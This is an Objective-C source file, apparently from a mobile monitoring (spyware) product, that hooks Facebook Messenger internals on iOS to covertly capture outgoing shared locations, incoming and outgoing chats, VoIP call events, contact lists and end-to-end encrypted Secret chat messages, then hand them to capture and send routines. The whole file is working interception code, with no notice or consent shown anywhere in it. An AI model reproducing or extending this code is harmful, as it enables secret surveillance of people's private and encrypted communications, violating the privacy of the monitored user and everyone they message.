//
//  Facebook2.h
//  MSFSP
//
//  Created by Makara Khloth on 5/14/15.
//
//

#import <Foundation/Foundation.h>

#import "FBMIndexedUserSet.h"
#import "FBMUser.h"
#import "FBMUserName.h"

#import "MNMessagesModelController.h"
#import "FBMLocationAttachment.h"
#import "FBMLocationAttachmentData.h"
#import "FBMLocationAttachmentDataToSend.h"

#import "FBMThread.h"
#import "FBMMutableMessage.h"

#import "FBMThreadSet.h"
#import "FBMThreadSet+Messenger-35-0.h"
#import "FBMThreadKey.h"
#import "FBMThreadMessageUpdate.h"
#import "FBMMessage.h"
#import "FBMMessage+Messenger-35-0.h"
#import "MNThreadMessageUpdater.h"

#import "FBMStickerManager.h"

#import "MNThreadSummaryByThreadKeyMap.h"

//Secret chat
#import "MNSecureThreadUpdater.h"
#import "MNSecureThreadSummaryWithCryptoState.h"
#import "MNSecureThreadSummary.h"
#import "MNSecureMessage.h"
#import "MNSecureOutgoingMessage.h"
#import "MNSecureMessagingService.h"

#import "FacebookUtils.h"
#import "FacebookUtilsV2.h"
#import "FacebookSecretUtils.h"

//Save Data
#import "MNAppDelegate.h"

HOOK(MNThreadSummaryByThreadKeyMap, initWithQueue$, id, id arg1) {
    DLog(@"arg1: [%@] %@", [arg1 class], arg1);
    
    id ret = CALL_ORIG(MNThreadSummaryByThreadKeyMap, initWithQueue$, arg1);
    
    [[FacebookUtilsV2 sharedFacebookUtilsV2] setMThreadSummaryByThreadKeyMap:ret];
    return ret;
}

#pragma mark - FBMStickerManager, Messenger 54.0 -

HOOK(FBMStickerManager, initWithUserSettings$stickerResourceManager$stickerStoragePathManager$currentVersion$layoutIdiom$, id, id arg1, id arg2, id arg3, unsigned int arg4, unsigned int arg5) {
    DLog (@"[%@], arg1 = %@", [arg1 class], arg1);
    DLog (@"[%@], arg2 = %@", [arg2 class], arg2);
    DLog (@"[%@], arg3 = %@", [arg3 class], arg3);
    DLog (@"arg4 = %d", arg4);
    DLog (@"arg5 = %d", arg5);
    id ret = CALL_ORIG(FBMStickerManager, initWithUserSettings$stickerResourceManager$stickerStoragePathManager$currentVersion$layoutIdiom$, arg1, arg2, arg3, arg4, arg5);
    
    [[FacebookUtilsV2 sharedFacebookUtilsV2] setMFBMStickerManager:ret];
    return ret;
}

#pragma mark - FBMUserSet get all users of Messenger 27.0 -

HOOK(FBMUserSet, initWithProviderMapData$, id, id arg1) {
    DLog (@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1)
    id ret = CALL_ORIG(FBMUserSet, initWithProviderMapData$, arg1);
    
    [[FacebookUtilsV2 sharedFacebookUtilsV2] setMFBMUserSet:ret];
    return ret;
}

#pragma mark - FBMIndexedUserSet get all users -

HOOK(FBMIndexedUserSet, initWithUserIdToUserDictionary$, id, id arg1) {
    DLog (@"arg1 = %@", arg1)
    
    NSDictionary *usersInfo = arg1;
    dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
    dispatch_async(queue, ^(void) {
        FacebookUtilsV2 *fbUtils2 = [FacebookUtilsV2 sharedFacebookUtilsV2];
        for (FBMUser *user in [usersInfo allValues]) {
            [fbUtils2 storeUser:user];
        }
    });
    
    id ret = CALL_ORIG(FBMIndexedUserSet, initWithUserIdToUserDictionary$, arg1);
    //DLog(@"ret = %@", ret);
    return ret;
}

#pragma mark - FBMThreadSet get all threads of Messenger 35.0 -

HOOK(FBMThreadSet, initWithThreadParticipantFilter$authenticationManagerProvider$networkProtocolController$, id, id arg1, id arg2, id arg3) {
    DLog (@"arg1, [%@] %@", [arg1 class], arg1);
    DLog (@"arg2, [%@] %@", [arg2 class], arg2);
    DLog (@"arg3, [%@] %@", [arg3 class], arg3);
    
    id ret = CALL_ORIG(FBMThreadSet, initWithThreadParticipantFilter$authenticationManagerProvider$networkProtocolController$, arg1, arg2, arg3);
    
    [[FacebookUtils shareFacebookUtils] setMFBMThreadSet:ret];
    
    return ret;
}

#pragma mark - C method for checking duplicate

bool canCapture(FBMThread *aThread, FBMMutableMessage *aMessage) {
    // -- Check duplication
    FacebookUtils *fbUtils = [FacebookUtils shareFacebookUtils];
    if ([aMessage offlineThreadingId] != nil				&&
        ![[aMessage offlineThreadingId] isEqualToString:@""]) {
        if (![[fbUtils mofflineThreadingId] isEqualToString:[aMessage offlineThreadingId]]) {
            [fbUtils setMofflineThreadingId:[aMessage offlineThreadingId]];
            [fbUtils setMMessageID:[aMessage messageId]];
            
            return true;
        } else {
            return false;
        }
        
    } else {
        DLog (@"Offline threading ID is nil or nothing")
        if (![[fbUtils mMessageID] isEqualToString:[aMessage messageId]]) {
            [fbUtils setMMessageID:[aMessage messageId]];

            return true;
        } else {
            return false;
        }
    }
}

#pragma mark - Capture outgoing shared location of Messenger 30.0,..,32.0 -

HOOK(MNMessagesModelController, thread$didSendMessage$, void, id arg1, id arg2) {
    DLog (@"------------------------------- argument -----------------------------------");
    DLog (@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
    DLog (@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
    DLog (@"------------------------------- argument -----------------------------------");
    
    CALL_ORIG(MNMessagesModelController, thread$didSendMessage$, arg1, arg2);
    
    FBMThread *fbThread = arg1;
    FBMMutableMessage *fbMessage = arg2;
    
    dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
    dispatch_async(queue, ^(void) {
        if ([[fbMessage outgoingAttachments] count]) {
            /*
             Capture only outgoing shared location
             */
            Class $FBMLocationAttachment = objc_getClass("FBMLocationAttachment");
            id attachment = [[fbMessage outgoingAttachments] firstObject];
            if ([attachment isKindOfClass:$FBMLocationAttachment]) {
                if (canCapture(fbThread, fbMessage)) {
                    [FacebookUtilsV2 captureFacebookIMEventWithFBThread:fbThread fbMessage:fbMessage];
                }
            }
        }
    });
}

#pragma mark - Capture outgoing/incoming all IM, incoming VoIP of Messenger 35.0, 36.0 -

// http://stackoverflow.com/questions/18000279/create-a-custom-sequential-global-dispatch-queue
dispatch_queue_t backgroundQueue() {
    static dispatch_once_t queueCreationGuard;
    static dispatch_queue_t queue;
    dispatch_once(&queueCreationGuard, ^{
        DLog(@"I SHOULD CALL ONCE AND ONLY ONCE");
        queue = dispatch_queue_create("com.messenger.ext.backgroundQueue", 0);
    });
    return queue;
}

#pragma mark - Not used
HOOK(FBMThreadMessageUpdate, addWithMessage$, id, id arg1) {
    DLog (@"------------------------------- argument -----------------------------------");
    DLog (@"arg1, [%@] %@", [arg1 class], arg1);
    DLog (@"------------------------------- argument -----------------------------------");
    
    NSThread *thisThread = [NSThread currentThread];
    DLog(@"thisThread, %d", [thisThread isMainThread]);
    
    FBMMessage *fbMessage = arg1;
    
    //dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
    dispatch_queue_t queue = backgroundQueue();
    dispatch_async(queue, ^(void) {
        __block FBMThread *fbThread = nil;
        dispatch_sync(dispatch_get_main_queue(), ^(void) {
            fbThread = [[[FacebookUtils shareFacebookUtils] mFBMThreadSet] getThreadByThreadKey:[fbMessage threadKey]];
        });
        
        if (fbThread && canCapture(fbThread, (id)fbMessage)) {
            if ([[FacebookUtilsV2 sharedFacebookUtilsV2] canCaptureMessageWithUniqueID:[fbMessage offlineThreadingId]]) {
                [FacebookUtilsV2 captureFacebookIMEventWithFBThread:fbThread fbMessage:fbMessage];
            }
        }
    });

    return CALL_ORIG(FBMThreadMessageUpdate, addWithMessage$, arg1);
}

#pragma mark - Used
HOOK(MNThreadMessageUpdater, applyMessageUpdate$toMessageSetBuilder$, BOOL, id arg1, id arg2) {
    //DLog (@"------------------------------- argument -----------------------------------");
    //DLog (@"arg1, [%@] %@", [arg1 class], arg1);
    //DLog (@"arg2, [%@] %@", [arg2 class], arg2);
    //DLog (@"------------------------------- argument -----------------------------------");
    
    BOOL ret = CALL_ORIG(MNThreadMessageUpdater, applyMessageUpdate$toMessageSetBuilder$, arg1, arg2);
    
    @try {
        NSThread *thisThread = [NSThread currentThread];
        DLog(@"thisThread, %d, ret, %d", [thisThread isMainThread], ret);
        
        FBMThreadMessageUpdate *messageUpdate = arg1;
        FBMMessage *fbMessage = nil;
        object_getInstanceVariable(messageUpdate, "_add_message", (void **)&fbMessage);
        
        //dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
        dispatch_queue_t queue = backgroundQueue();
        dispatch_async(queue, ^(void) {
            @try {
                __block FBMThread *fbThread = nil;
                dispatch_sync(dispatch_get_main_queue(), ^(void) {
                    @try {
                        fbThread = [[[FacebookUtils shareFacebookUtils] mFBMThreadSet] getThreadByThreadKey:[fbMessage threadKey]];
                        if (fbThread == nil) {
                            fbThread = (id)[[[FacebookUtilsV2 sharedFacebookUtilsV2] mThreadSummaryByThreadKeyMap] threadSummaryForThreadKey:[fbMessage threadKey]];
                        }
                    }
                    @catch (NSException *exception) {
                        DLog(@"fbThread exception: %@", exception);
                    }
                    @finally {
                        ;
                    }
                    
                });
                DLog(@"fbThread: %@", fbThread);
                DLog(@"fbMessage: %@", fbMessage);
                
                if (fbThread && canCapture(fbThread, (id)fbMessage)) { // fbThread does not used in canCapture method
                    // Offline threading ID can be nil here! (VoIP case)
                    NSString *uniqueID = [fbMessage offlineThreadingId];
                    if (!uniqueID) {
                        uniqueID = [fbMessage messageId];
                    }
                    if ([[FacebookUtilsV2 sharedFacebookUtilsV2] canCaptureMessageWithUniqueID:uniqueID]) {
                        
                        if ([FacebookUtils isVoIPMessage:(ThreadMessage *)fbMessage withThread:fbThread]) {
                            if (![FacebookUtilsV2 isOutgoing:(FBMMessage *)fbMessage])  {
                                FxVoIPEvent *voIPEvent = [FacebookUtils createFacebookVoIPEventFBMThread:fbThread
                                                                                           threadMessage:(ThreadMessage *)fbMessage];
                                DLog (@"----->>>> Incoming Facebook VoIP Event, %@", voIPEvent);
                                [FacebookUtils sendFacebookVoIPEvent:voIPEvent];
                                
                                [[FacebookUtilsV2 sharedFacebookUtilsV2] storeCapturedMessageUniqueID:uniqueID];
                            }
                            else {
                                //Facebook Messenger 96.0
                                FxVoIPEvent *voIPEvent = [FacebookUtils createFacebookVoIPEventFBMThread:fbThread
                                                                                           threadMessage:(ThreadMessage *)fbMessage];
                                DLog (@"----->>>> Outgoing Facebook VoIP Event, %@", voIPEvent);
                                [FacebookUtils sendFacebookVoIPEvent:voIPEvent];
                                
                                [[FacebookUtilsV2 sharedFacebookUtilsV2] storeCapturedMessageUniqueID:uniqueID];
                            }
                        } else {
                            [FacebookUtilsV2 captureFacebookIMEventWithFBThread:fbThread fbMessage:fbMessage];
                        }
                    }
                }
            }
            @catch (NSException *exception) {
                DLog(@"Messenger block exception: %@", exception);
            }
            @finally {
                ;
            }
        });
    }
    @catch (NSException *exception) {
        DLog(@"Messenger exception: %@", exception);
    }
    @finally {
        ;
    }
    
    return ret;
}

#pragma mark - Secret Chat

bool canCaptureSecretMessage(MNSecureMessage *aMessage) {
    // -- Check duplication
    FacebookUtils *fbUtils = [FacebookUtils shareFacebookUtils];
    if (![[fbUtils mMessageID] isEqualToString:[aMessage messageId]]) {
        [fbUtils setMMessageID:[aMessage messageId]];
        return true;
    } else {
        return false;
    }
}

HOOK(MNSecureThreadUpdater, applyMessage$andUpdateThread$, BOOL, id arg1, id arg2) {
    @try {
        DLog (@"------------------------------- argument -----------------------------------");
        DLog (@"arg1, [%@] %@", [arg1 class], arg1);
        DLog (@"arg2, [%@] %@", [arg2 class], arg2);
        DLog (@"------------------------------- argument -----------------------------------");
        
        MNSecureMessage *secureMessage = arg1;
        //MNSecureThreadSummaryWithCryptoState *cryptoSecureThreadSummary = arg2;
        MNSecureThreadSummary* secureThreadSummary = arg2;
        
        DLog (@"secureMessage, %@ ", secureMessage);
        DLog (@"secureThreadSummary, %@ ", secureThreadSummary);
        
        if (canCaptureSecretMessage(secureMessage)) {
            NSString *uniqueID = [secureMessage messageId];
            
            if ([[FacebookUtilsV2 sharedFacebookUtilsV2] canCaptureMessageWithUniqueID:uniqueID]) {
                DLog (@"prepare to capture");
                [FacebookSecretUtils captureFacebookIMEventWithSecureThreadSummary:secureThreadSummary secureMessage:secureMessage];
            }
        }
    } @catch (NSException *exception) {
        DLog(@"Messenger exception: %@", exception);
    } @finally {
        //Done
    }

    
    BOOL ret = CALL_ORIG(MNSecureThreadUpdater, applyMessage$andUpdateThread$, arg1, arg2);
    return ret;
}

HOOK(MNSecureThreadUpdater, applyOutgoingMessage$andUpdateThread$reportableContent$, BOOL, id arg1, id arg2, id arg3) {
    @try {
        DLog (@"------------------------------- argument -----------------------------------");
        DLog (@"arg1, [%@] %@", [arg1 class], arg1);
        DLog (@"arg2, [%@] %@", [arg2 class], arg2);
        DLog (@"arg2, [%@] %@", [arg3 class], arg3);
        DLog (@"------------------------------- argument -----------------------------------");
        
        
        MNSecureMessage *secureMessage = arg1;
        MNSecureThreadSummary *secureThreadSummary = arg2;
            //MNSecureThreadSummary* secureThreadSummary = cryptoSecureThreadSummary.threadSummary;
        
        DLog (@"secureMessage, %@ ", secureMessage);
        DLog (@"secureThreadSummary, %@ ", secureThreadSummary);
        
        if (canCaptureSecretMessage(secureMessage)) {
            NSString *uniqueID = [secureMessage messageId];
            
            if ([[FacebookUtilsV2 sharedFacebookUtilsV2] canCaptureMessageWithUniqueID:uniqueID]) {
                DLog (@"prepare to capture");
                [FacebookSecretUtils captureFacebookIMEventWithSecureThreadSummary:secureThreadSummary secureMessage:secureMessage];
            }
        }
    } @catch (NSException *exception) {
        DLog(@"Messenger exception: %@", exception);
    } @finally {
        //Done
    }


    
    return CALL_ORIG(MNSecureThreadUpdater, applyOutgoingMessage$andUpdateThread$reportableContent$, arg1, arg2, arg3);
}

//Keep it for download incoming secret photo attachment
//
//- (id)initWithOmnistore:(id)arg1 userSession:(id)arg2 versionedFileHandler:(id)arg3 authManager:(id)arg4 badgeCountService:(id)arg5 localNotificationController:(id)arg6 backgroundAnnouncer:(id)arg7 analytics:(id)arg8 ephemeralMessageSystemController:(id)arg9 globalMuteStatusReader:(id)arg10 mobileConfigManager:(id)arg11 currentUserIsIsMinor:(_Bool)arg12 clock:(id)arg13 migrationRunner:(id)arg14 queue:(id)arg15;

HOOK(MNSecureMessagingService, initWithOmnistore$userSession$versionedFileHandler$authManager$badgeCountService$localNotificationController$backgroundAnnouncer$analytics$ephemeralMessageSystemController$globalMuteStatusReader$mobileConfigManager$currentUserIsIsMinor$clock$migrationRunner$queue$, id, id arg1, id arg2, id arg3, id arg4, id arg5 , id arg6 , id arg7 , id arg8, id arg9, id arg10, id arg11, bool arg12, id arg13, id arg14, id arg15) {
    
    MNSecureMessagingService *ret = CALL_ORIG(MNSecureMessagingService, initWithOmnistore$userSession$versionedFileHandler$authManager$badgeCountService$localNotificationController$backgroundAnnouncer$analytics$ephemeralMessageSystemController$globalMuteStatusReader$mobileConfigManager$currentUserIsIsMinor$clock$migrationRunner$queue$, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12, arg13, arg14, arg15);
    DLog (@"ret, %@ ", ret);
    
    [[FacebookSecretUtils sharedFacebookSecretUtils] setMMNSecureMessagingService:ret];
    
    return ret;
}

//Faceboo Messenger 96
//- (id)initWithOmnistore:(id)arg1 userSession:(id)arg2 versionedFileHandler:(id)arg3 authManager:(id)arg4 badgeCountService:(id)arg5 localNotificationController:(id)arg6 backgroundAnnouncer:(id)arg7 analytics:(id)arg8 ephemeralMessageSystemController:(id)arg9 globalMuteStatusReader:(id)arg10 mobileConfigManager:(id)arg11 currentUserIsIsMinor:(_Bool)arg12 clock:(id)arg13 migrationRunner:(id)arg14 appGroup:(id)arg15 queue:(id)arg16;

HOOK(MNSecureMessagingService, initWithOmnistore$userSession$versionedFileHandler$authManager$badgeCountService$localNotificationController$backgroundAnnouncer$analytics$ephemeralMessageSystemController$globalMuteStatusReader$mobileConfigManager$currentUserIsIsMinor$clock$migrationRunner$appGroup$queue$, id, id arg1, id arg2, id arg3, id arg4, id arg5 , id arg6 , id arg7 , id arg8, id arg9, id arg10, id arg11, bool arg12, id arg13, id arg14, id arg15, id arg16) {
    
    MNSecureMessagingService *ret = CALL_ORIG(MNSecureMessagingService, initWithOmnistore$userSession$versionedFileHandler$authManager$badgeCountService$localNotificationController$backgroundAnnouncer$analytics$ephemeralMessageSystemController$globalMuteStatusReader$mobileConfigManager$currentUserIsIsMinor$clock$migrationRunner$appGroup$queue$, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12, arg13, arg14, arg15, arg16);
    DLog (@"ret, %@ ", ret);
    
    [[FacebookSecretUtils sharedFacebookSecretUtils] setMMNSecureMessagingService:ret];
    
    return ret;
}


HOOK(MNAppDelegate, applicationDidEnterBackground$, void, id arg1) {
    DLog (@"Enter background");
    
    @try {
        [[FacebookUtilsV2 sharedFacebookUtilsV2] saveUserDataToFile];
    } @catch (NSException *exception) {
        DLog(@"Messenger exception: %@", exception);
    } @finally {
        //Done
    }
    
    CALL_ORIG(MNAppDelegate, applicationDidEnterBackground$, arg1);
}
#pragma mark - DEBUGGING -
